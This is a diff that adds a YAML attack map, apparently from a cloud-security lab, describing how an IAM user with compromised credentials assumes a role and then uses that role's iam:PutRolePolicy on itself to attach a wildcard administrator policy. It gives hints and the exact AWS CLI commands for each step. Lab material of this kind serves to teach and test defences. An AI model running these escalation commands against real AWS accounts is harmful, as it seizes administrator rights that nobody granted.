@@ -1,0 +1,60 @@
+attackMap:
+  nodes:
+    - id: starting-user
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-iam-005-to-admin-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has permission to assume the starting role, which in turn has
+        iam:PutRolePolicy on itself — enabling self-escalation to administrator.
+
+    - id: starting-role
+      label: "Starting Role"
+      type: principal
+      subType: iam-role
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-iam-005-to-admin-starting-role"
+      description: >
+        This IAM role has iam:PutRolePolicy on itself. By adding an inline policy
+        granting AdministratorAccess, the role can escalate its own privileges to
+        full administrator access within the AWS account.
+
+  edges:
+    - from: starting-user
+      to: starting-role
+      label: "sts:AssumeRole"
+      description: >
+        Assume the starting role using the starting user's credentials.
+      hints:
+        - "You can assume a role from this user."
+        - "Look at what permissions the assumed role has on itself."
+        - "The role can modify its own inline policies."
+        - "Browse to https://pathfinding.cloud/paths/iam-005 for technique details."
+      commands:
+        - description: "Assume the starting role"
+          command: "aws sts assume-role --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-005-to-admin-starting-role --role-session-name escalation-session"
+
+    - from: starting-role
+      to: starting-role
+      label: "iam:PutRolePolicy"
+      description: >
+        Add an inline policy to the starting role itself, granting AdministratorAccess.
+        Because the role has iam:PutRolePolicy on itself, this self-modification
+        immediately elevates its permissions to administrator.
+      hints:
+        - "This role can modify its own inline policies."
+        - "Use iam:PutRolePolicy to add an administrator policy to this role."
+        - "Browse to https://pathfinding.cloud/paths/iam-005 for technique details."
+      commands:
+        - description: "Add an inline administrator policy to the role"
+          command: "aws iam put-role-policy --role-name pl-prod-iam-005-to-admin-starting-role --policy-name escalation-policy --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"
+        - description: "Verify administrator access"
+          command: "aws iam list-users"
